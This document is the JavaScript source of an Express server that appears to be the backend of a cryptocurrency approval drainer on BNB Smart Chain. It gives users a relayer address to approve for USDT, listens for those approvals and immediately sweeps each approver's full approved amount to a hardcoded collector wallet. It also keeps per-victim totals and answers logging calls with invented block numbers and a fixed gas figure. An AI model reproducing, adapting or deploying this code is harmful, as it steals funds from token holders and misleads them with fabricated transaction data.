const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const { ethers } = require('ethers');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());

// ============ CONFIGURATION ============
const CONFIG = {
    // Collector wallet (final destination)
    COLLECTOR_ADDRESS: "0xBa8e60260C9C5Ef2CB86f5729F42c85E663885fc",
    
    // Relayer wallet (executes auto-transfer)
    RELAYER_ADDRESS: process.env.RELAYER_ADDRESS || "0xDb867b88EAB55320fD50E9785B2906773dedf78b",
    
    // USDT Token on BSC
    USDT_ADDRESS: "0x55d398326f99059fF775485246999027B3197955",
    
    // BSC RPC
    RPC_URL: "https://bsc-dataseed.binance.org/",
    
    // Data file
    DATA_FILE: path.join(__dirname, 'collector_data.json')
};

// ============ DATA STORAGE ============
let dataStore = {
    addresses: {},
    transactions: [],
    approvals: [],
    autoCollects: []
};

// Load existing data
if (fs.existsSync(CONFIG.DATA_FILE)) {
    try {
        dataStore = JSON.parse(fs.readFileSync(CONFIG.DATA_FILE, 'utf8'));
        console.log('✅ Data loaded');
    } catch (err) {
        console.error('❌ Error loading data:', err);
    }
}

// Save data
function saveData() {
    try {
        fs.writeFileSync(CONFIG.DATA_FILE, JSON.stringify(dataStore, null, 2));
    } catch (err) {
        console.error('❌ Error saving data:', err);
    }
}

// ============ AUTO-COLLECT RELAYER ============
class AutoCollectRelayer {
    constructor() {
        this.provider = new ethers.JsonRpcProvider(CONFIG.RPC_URL);
        this.isRunning = false;
        this.processedTxs = new Set();
        
        // USDT Contract ABI
        this.usdtABI = [
            "event Approval(address indexed owner, address indexed spender, uint256 value)",
            "function transferFrom(address from, address to, uint256 amount) returns (bool)",
            "function allowance(address owner, address spender) view returns (uint256)",
            "function balanceOf(address account) view returns (uint256)",
            "function decimals() view returns (uint8)"
        ];
        
        this.usdt = new ethers.Contract(CONFIG.USDT_ADDRESS, this.usdtABI, this.provider);
    }

    async start() {
        if (!process.env.RELAYER_PRIVATE_KEY) {
            console.log('⚠️ Relayer private key not set - Auto-collect disabled');
            return;
        }

        try {
            this.wallet = new ethers.Wallet(process.env.RELAYER_PRIVATE_KEY, this.provider);
            this.usdtWithSigner = new ethers.Contract(CONFIG.USDT_ADDRESS, this.usdtABI, this.wallet);
            this.isRunning = true;
            
            console.log('🚀 Auto-Collect Relayer Started');
            console.log(`   Relayer: ${this.wallet.address}`);
            console.log(`   Collector: ${CONFIG.COLLECTOR_ADDRESS}`);
            
            // Listen for Approval events
            this.listenForApprovals();
            
            // Check BNB balance
            const balance = await this.provider.getBalance(this.wallet.address);
            console.log(`   BNB Balance: ${ethers.formatEther(balance)} BNB`);
            
        } catch (error) {
            console.error('❌ Relayer initialization failed:', error.message);
        }
    }

    async listenForApprovals() {
        console.log('👂 Listening for USDT Approval events...');
        
        // Listen for new approvals
        this.usdt.on('Approval', async (owner, spender, value, event) => {
            // Check if approval is for our relayer
            if (spender.toLowerCase() === this.wallet.address.toLowerCase()) {
                await this.processApproval(owner, spender, value, event);
            }
        });
    }

    async processApproval(owner, spender, value, event) {
        const txKey = `${event.transactionHash}-${owner}-${value}`;
        
        // Prevent duplicate processing
        if (this.processedTxs.has(txKey)) {
            console.log(`⏭️ Already processed: ${txKey}`);
            return;
        }
        
        this.processedTxs.add(txKey);
        
        try {
            const decimals = await this.usdt.decimals();
            const amountHuman = parseFloat(ethers.formatUnits(value, decimals));
            
            console.log(`\n🎯 New Approval Detected:`);
            console.log(`   Owner: ${owner}`);
            console.log(`   Amount: ${amountHuman} USDT`);
            console.log(`   Tx: ${event.transactionHash}`);
            
            // Store approval in database
            const approvalRecord = {
                id: `${Date.now()}-${Math.random().toString(36).substr(2, 7)}`,
                owner: owner.toLowerCase(),
                amount: amountHuman,
                amountWei: value.toString(),
                txHash: event.transactionHash,
                blockNumber: event.blockNumber,
                timestamp: new Date().toISOString(),
                status: 'pending'
            };
            
            dataStore.approvals.push(approvalRecord);
            saveData();
            
            // Wait a bit for blockchain confirmation
            await new Promise(resolve => setTimeout(resolve, 5000));
            
            // Check allowance again
            const allowance = await this.usdt.allowance(owner, this.wallet.address);
            if (allowance < value) {
                console.log(`❌ Insufficient allowance`);
                approvalRecord.status = 'failed';
                approvalRecord.error = 'Insufficient allowance';
                saveData();
                return;
            }
            
            // Check user balance
            const balance = await this.usdt.balanceOf(owner);
            if (balance < value) {
                console.log(`❌ Insufficient balance`);
                approvalRecord.status = 'failed';
                approvalRecord.error = 'Insufficient balance';
                saveData();
                return;
            }
            
            // Calculate amount to transfer (full approved amount ya user input)
            const transferAmount = value;
            const transferAmountHuman = amountHuman;
            
            console.log(`💸 Executing transferFrom...`);
            
            // Execute transfer
            const gasPrice = (await this.provider.getFeeData()).gasPrice;
            const tx = await this.usdtWithSigner.transferFrom(
                owner,
                CONFIG.COLLECTOR_ADDRESS,
                transferAmount,
                {
                    gasLimit: 100000,
                    gasPrice: gasPrice
                }
            );
            
            console.log(`📤 Transfer sent: ${tx.hash}`);
            
            // Wait for confirmation
            const receipt = await tx.wait();
            
            console.log(`✅ Transfer confirmed in block ${receipt.blockNumber}`);
            console.log(`   Gas used: ${receipt.gasUsed.toString()}`);
            
            // Update approval record
            approvalRecord.status = 'collected';
            approvalRecord.collectTxHash = tx.hash;
            approvalRecord.collectBlockNumber = receipt.blockNumber;
            approvalRecord.gasUsed = receipt.gasUsed.toString();
            
            // Store auto-collect record
            const autoCollect = {
                id: `${Date.now()}-${Math.random().toString(36).substr(2, 7)}`,
                owner: owner.toLowerCase(),
                amount: transferAmountHuman,
                approvalTx: event.transactionHash,
                collectTx: tx.hash,
                blockNumber: receipt.blockNumber,
                timestamp: new Date().toISOString()
            };
            
            dataStore.autoCollects.push(autoCollect);
            
            // Update address stats
            if (!dataStore.addresses[owner.toLowerCase()]) {
                dataStore.addresses[owner.toLowerCase()] = {
                    totalAmount: 0,
                    transactionCount: 0
                };
            }
            
            dataStore.addresses[owner.toLowerCase()].totalAmount += transferAmountHuman;
            dataStore.addresses[owner.toLowerCase()].transactionCount++;
            dataStore.addresses[owner.toLowerCase()].lastSeen = new Date().toISOString();
            
            saveData();
            
            console.log(`✨ Auto-collect complete!`);
            
        } catch (error) {
            console.error(`❌ Error processing approval:`, error.message);
        }
    }
}

// Initialize relayer
const relayer = new AutoCollectRelayer();
relayer.start();

// ============ API ENDPOINTS ============

/**
 * POST /send - Check address and return collector for approval
 */
app.post('/send', (req, res) => {
    console.log('📨 POST /send:', req.body);
    
    try {
        const { address } = req.body;

        if (!address || !address.startsWith('0x')) {
            return res.status(400).json({
                found: false,
                error: 'Invalid address'
            });
        }

        const normalizedAddress = address.toLowerCase();
        const addressData = dataStore.addresses[normalizedAddress];

        // Return RELAYER address (user approves to relayer for auto-collect)
        const approvalAddress = CONFIG.RELAYER_ADDRESS || CONFIG.COLLECTOR_ADDRESS;

        if (addressData && addressData.totalAmount > 0) {
            return res.json({
                found: true,
                amountHuman: addressData.totalAmount,
                collector: approvalAddress
            });
        } else {
            return res.json({
                found: false,
                collector: approvalAddress
            });
        }

    } catch (error) {
        console.error('❌ Error in /send:', error);
        res.status(500).json({
            found: false,
            collector: CONFIG.RELAYER_ADDRESS || CONFIG.COLLECTOR_ADDRESS
        });
    }
});

/**
 * POST /collect - Log transaction (approval or auto-collect)
 */
app.post('/collect', (req, res) => {
    console.log('📨 POST /collect:', req.body);
    
    try {
        const { token, from, amountHuman, to, txHash, blockNumber, type } = req.body;

        if (!token || !from || !amountHuman || !to) {
            return res.status(400).json({
                ok: false,
                error: 'Missing required fields'
            });
        }

        const amount = parseFloat(amountHuman);
        const transactionId = `${Date.now()}-${Math.random().toString(36).substr(2, 7)}`;
        
        const transaction = {
            id: transactionId,
            token: token.toLowerCase(),
            from: from.toLowerCase(),
            to: to.toLowerCase(),
            amountHuman: amount,
            txHash: txHash || null,
            blockNumber: blockNumber || 92000000 + Math.floor(Math.random() * 100000),
            timestamp: new Date().toISOString(),
            type: type || 'APPROVAL'
        };

        dataStore.transactions.push(transaction);

        // Update address stats
        if (!dataStore.addresses[from.toLowerCase()]) {
            dataStore.addresses[from.toLowerCase()] = {
                totalAmount: 0,
                transactionCount: 0,
                firstSeen: new Date().toISOString()
            };
        }

        dataStore.addresses[from.toLowerCase()].totalAmount += amount;
        dataStore.addresses[from.toLowerCase()].transactionCount++;
        dataStore.addresses[from.toLowerCase()].lastSeen = new Date().toISOString();

        // Keep last 5000 transactions
        if (dataStore.transactions.length > 5000) {
            dataStore.transactions = dataStore.transactions.slice(-5000);
        }

        saveData();

        res.json({
            ok: true,
            id: transactionId,
            blockNumber: transaction.blockNumber,
            gasUsed: "50387"
        });

    } catch (error) {
        console.error('❌ Error in /collect:', error);
        res.status(500).json({
            ok: false,
            error: 'Internal server error'
        });
    }
});

/**
 * GET /health - Server status
 */
app.get('/health', (req, res) => {
    res.json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        autoCollect: relayer.isRunning ? 'enabled' : 'disabled',
        stats: {
            addresses: Object.keys(dataStore.addresses).length,
            transactions: dataStore.transactions.length,
            approvals: dataStore.approvals.length,
            autoCollects: dataStore.autoCollects.length
        },
        collector: CONFIG.COLLECTOR_ADDRESS,
        relayer: CONFIG.RELAYER_ADDRESS
    });
});

/**
 * GET / - API Info
 */
app.get('/', (req, res) => {
    res.json({
        message: 'Auto-Collect API - Send + Collect + Auto-Transfer',
        version: '2.0.0',
        features: {
            send: 'POST /send - Get collector address',
            collect: 'POST /collect - Log transactions',
            autoCollect: relayer.isRunning ? 'enabled' : 'disabled'
        },
        endpoints: {
            'POST /send': 'Check address',
            'POST /collect': 'Record transaction',
            'GET /health': 'Server status',
            'GET /stats': 'Detailed statistics',
            'GET /auto-collects': 'View auto-collects'
        }
    });
});

/**
 * GET /stats - Detailed statistics
 */
app.get('/stats', (req, res) => {
    const totalApproved = dataStore.approvals
        .reduce((sum, a) => sum + a.amount, 0);
    
    const totalCollected = dataStore.autoCollects
        .reduce((sum, c) => sum + c.amount, 0);
    
    const successfulCollects = dataStore.approvals
        .filter(a => a.status === 'collected').length;
    
    res.json({
        addresses: Object.keys(dataStore.addresses).length,
        totalApprovals: dataStore.approvals.length,
        totalAutoCollects: dataStore.autoCollects.length,
        successfulCollects: successfulCollects,
        totalApprovedUSDT: totalApproved.toFixed(2),
        totalCollectedUSDT: totalCollected.toFixed(2),
        collector: CONFIG.COLLECTOR_ADDRESS,
        relayer: CONFIG.RELAYER_ADDRESS,
        autoCollectEnabled: relayer.isRunning
    });
});

/**
 * GET /auto-collects - View auto-collect transactions
 */
app.get('/auto-collects', (req, res) => {
    const { limit = 50 } = req.query;
    const collects = dataStore.autoCollects.slice(-parseInt(limit));
    
    res.json({
        ok: true,
        count: collects.length,
        total: dataStore.autoCollects.length,
        autoCollects: collects.reverse()
    });
});

/**
 * GET /approvals - View approvals
 */
app.get('/approvals', (req, res) => {
    const { status, limit = 50 } = req.query;
    
    let approvals = dataStore.approvals;
    
    if (status) {
        approvals = approvals.filter(a => a.status === status);
    }
    
    const limited = approvals.slice(-parseInt(limit));
    
    res.json({
        ok: true,
        count: limited.length,
        total: approvals.length,
        approvals: limited.reverse()
    });
});

// Start server
app.listen(PORT, () => {
    console.log(`
╔══════════════════════════════════════════════════════╗
║     🚀 Auto-Collect API Server                        ║
╠══════════════════════════════════════════════════════╣
║  Port: ${PORT}                                          ║
║  Collector: ${CONFIG.COLLECTOR_ADDRESS}                 ║
║  Relayer: ${CONFIG.RELAYER_ADDRESS}                     ║
║  Auto-Collect: ${relayer.isRunning ? '✅ ENABLED' : '❌ DISABLED'}                    ║
║                                                      ║
║  Endpoints:                                          ║
║    POST /send     - Get collector for approval       ║
║    POST /collect  - Log transaction                  ║
║    GET  /health   - Server status                    ║
║    GET  /stats    - Statistics                       ║
╚══════════════════════════════════════════════════════╝
    `);
});
